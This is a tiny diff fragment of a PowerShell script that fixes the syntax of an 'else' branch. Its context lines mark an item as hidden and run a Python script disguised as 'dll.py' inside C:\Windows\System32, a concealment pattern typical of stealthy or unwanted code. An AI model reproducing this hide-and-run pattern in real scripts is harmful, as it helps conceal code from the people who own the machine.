@@ -15,9 +15,8 @@ else{
         $Hide.Attributes = "hidden"
         python "C:\Windows\System32\dll.py"
         }
-    else ($bol1){
+    else {
       	python "C:\Windows\System32\dll.py"
     
     }
 }
-
